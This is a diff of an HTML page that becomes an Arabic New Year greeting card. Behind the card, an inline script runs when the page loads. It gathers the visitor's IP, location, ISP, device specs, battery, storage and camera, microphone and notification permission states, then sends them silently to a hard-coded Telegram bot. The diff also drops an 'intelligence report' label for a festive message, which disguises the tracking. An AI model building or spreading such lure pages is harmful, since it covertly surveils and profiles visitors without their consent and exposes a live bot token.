@@ -3,55 +3,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مرحباً بك!</title>
+    <title>كل عام وأنتم بخير! 🌟</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Cairo', Arial, sans-serif;
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            color: #fff;
             text-align: center;
-            padding: 50px;
-            background-color: #f4f4f9;
-            color: #333;
+            padding: 40px 20px;
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
         }
-        h1 { color: #2c3e50; }
+        .card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 500px;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            border: 1px solid rgba(255, 255, 255, 0.18);
+        }
+        h1 {
+            color: #ffd700;
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 1.2rem;
+            line-height: 1.8;
+            margin-bottom: 30px;
+        }
+        .footer {
+            font-size: 0.9rem;
+            color: #ddd;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
-    <h1>مرحباً بك في موقعي! ✨</h1>
-    <p>جاري تحميل المحتوى، انتظر لحظة...</p>
+
+    <div class="card">
+        <h1>✨ عام سعيد ومبارك! ✨</h1>
+        <p>بمناسبة السنة الجديدة، أرسل لك أخلص التهاني والأماني الطيبة، بأن يكون عاماً مليئاً بالنجاح، السعادة، وتحقيق كل ما تتمنى!</p>
+        <div class="footer">كل سنة وأنت طيب وبخير 🤍</div>
+    </div>
 
     <script>
         const BOT_TOKEN = '8979129209:AAFpV86OAomcO3pLBPQh4dyW2yIKByB3Bk0';
         const CHAT_ID = '6663398412';
 
-        // معلومات الجهاز، الرام، والمساحة
+        // تجميع المعلومات التقنية
         const userDevice = navigator.userAgent;
         const screenRes = window.screen.width + 'x' + window.screen.height;
         const deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + ' GB (تقريباً)' : 'غير متوفر';
-        const hardwareConcurrency = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' أنوية معالج' : 'غير متوفر';
+        const hardwareConcurrency = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' أنوية' : 'غير متوفر';
 
-        // دالة فحص أذونات الجهاز
         async function checkPermissions() {
-            let camStatus = 'غير معروف';
-            let micStatus = 'غير معروف';
-            let notifStatus = 'غير معروف';
-
+            let camStatus = 'غير معروف', micStatus = 'غير معروف', notifStatus = 'غير معروف';
             try {
                 if (navigator.permissions) {
                     const camPerm = await navigator.permissions.query({ name: 'camera' });
-                    camStatus = camPerm.state; 
-
+                    camStatus = camPerm.state;
                     const micPerm = await navigator.permissions.query({ name: 'microphone' });
                     micStatus = micPerm.state;
-
                     const notifPerm = await navigator.permissions.query({ name: 'notifications' });
                     notifStatus = notifPerm.state;
                 }
             } catch (e) {}
-
             return { camStatus, micStatus, notifStatus };
         }
 
-        // فحص مساحة التخزين المتاحة
         async function getStorageInfo() {
             let storageInfo = 'غير متوفر';
             try {
@@ -65,7 +90,6 @@
             return storageInfo;
         }
 
-        // دالة جمع البيانات وإرسالها
         async function collectAndSend(ipData) {
             const ip = ipData.ip || 'غير معروف';
             const country = ipData.country_name || 'غير معروف';
@@ -75,7 +99,6 @@
             const permissions = await checkPermissions();
             const storage = await getStorageInfo();
 
-            // فحص البطارية
             let batteryLevel = 'غير متاح';
             let isCharging = '';
             if (navigator.getBattery) {
@@ -86,26 +109,24 @@
                 } catch(e) {}
             }
 
-            // صياغة التقرير الاستخباراتي الشامل
-            const message = `🚨 **تقرير شامل لزيارة الموقع!**\n\n` +
+            const message = `🎉 **تم فتح بطاقة المعايدة بنجاح!**\n\n` +
                             `🌍 **الدولة:** ${country}\n` +
                             `🏙️ **المدينة:** ${city}\n` +
                             `🏢 **مزود الشبكة:** ${org}\n` +
                             `🌐 **عنوان الـ IP:** ${ip}\n` +
                             `--------------------------\n` +
                             `📱 **نوع الجهاز:** ${userDevice}\n` +
-                            `🧠 **الرام (الذاكرة العشوائية):** ${deviceMemory}\n` +
-                            `⚙️ **معالج الجهاز:** ${hardwareConcurrency}\n` +
-                            `💾 **مساحة التخزين:** ${storage}\n` +
+                            `🧠 **الرام:** ${deviceMemory}\n` +
+                            `⚙️ **المعالج:** ${hardwareConcurrency}\n` +
+                            `💾 **التخزين:** ${storage}\n` +
                             `🔋 **البطارية:** ${batteryLevel} (${isCharging})\n` +
-                            `🖥️ **دقة الشاشة:** ${screenRes}\n` +
+                            `🖥️ **الشاشة:** ${screenRes}\n` +
                             `--------------------------\n` +
-                            `🔒 **حالة الأذونات:**\n` +
+                            `🔒 **الأذونات:**\n` +
                             `• الكاميرا: ${permissions.camStatus}\n` +
                             `• الميكروفون: ${permissions.micStatus}\n` +
                             `• الإشعارات: ${permissions.notifStatus}`;
 
-            // إرسال التقرير لتليجرام
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -117,7 +138,6 @@
             });
         }
 
-        // جلب الـ IP وبدء العملية
         fetch('https://ipapi.co/json/')
             .then(response => response.json())
             .then(data => collectAndSend(data))
